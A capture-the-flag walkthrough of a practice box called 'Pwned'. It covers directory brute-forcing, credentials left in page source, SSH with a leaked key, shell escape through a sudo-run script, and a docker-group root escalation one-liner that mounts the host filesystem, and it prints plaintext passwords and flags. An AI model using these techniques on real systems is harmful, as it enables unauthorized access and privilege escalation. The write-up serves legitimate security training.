# Pwned (Easy)

>MrMidnight | 16.August.2022

----------

### Target IP: 192.168.1.106

## 1. Reconz
Alright first lets do the recon:

```bash
nmap -sC -sV -oA scans/Nmap/target 192.168.1.106
```

A http server is running on its default port and a frp server on port 21.
The website shows nothing interesting and nothing in the source code. So lets do a gobuster scan:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.106  -o scans/Gobuster/gobuster
```

The result came out with:

```
/nothing              (Status: 301) [Size: 316] [--> http://192.168.1.106/nothing/]
/server-status        (Status: 403) [Size: 278]
/hidden_text          (Status: 301) [Size: 320] [--> http://192.168.1.106/hidden_text/]
```

Inside /nothing is well you guessed it, nothing importent. But in the /hidden_text, we can find a dictionary called secret.dic. We can download the file via wget:

```bash
wget http://pwned.hmv/hidden_text/secret.dic
```

Lets scan the url again with the dictionary:

```bash
gobuster dir -w secret.dic -u http://192.168.1.106  -o scans/Gobuster/gobuster2
```

It returns with "/pwned.vuln". So lets visit that. In the dir, we can find a login page. The credentials for the login is in the source code:

>User: ftpuser
>Passwd: B0ss_B!TcH


## 2. Login as ariana
We dont even need to login into the page. All we need to do is login into the ftp server:

```bash
ftp 192.168.1.106
```

After a success login, we can find a note and a ssh key in the shared directory. The note file reveals the user, which is "ariana". With both info, we can ssh into the target:

```bash
chmod 600 id_rsa
ssh -i id_rsa ariana@192.168.1.106
```

Since this box is more like an ctf, there is 2 USER-FLAGS. Submitting one of them will be fine.

## FIRST-USER-FLAG

>fb8d98be1265dd88bac522e1b2182140



## 3. Enum and priv esc for second user

Executing "sudo -l" shows that we can exec /home/messenger.sh as the second user "selena" with no password:

```bash
cd /home
sudo -u selena ./messenger.sh
```

Just enter "bash" for username and "bash"  to get an bash shell as selena. 

```
ariana:
selena:
ftpuser:

Enter username to send message : bash

Enter message for bash :bash
python3 -c 'import pty;pty.spawn ("/bin/bash")'
selena@pwned:/home$ whoami
selena
```

## SECON-USER-FLAG
>711fdfc6caad532815a440f7f295c176

## 4. Priv esc to root

The selena user is a part of the docker group, when we show the "id". This means we can just get an root shell by running this command:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

[This article]([docker-privesc | Privilege escalation in Docker (flast101.github.io)](https://flast101.github.io/docker-privesc/)) will tell you how it works.

## ROOT-FLAG
>4d4098d64e163d2726959455d046fd7c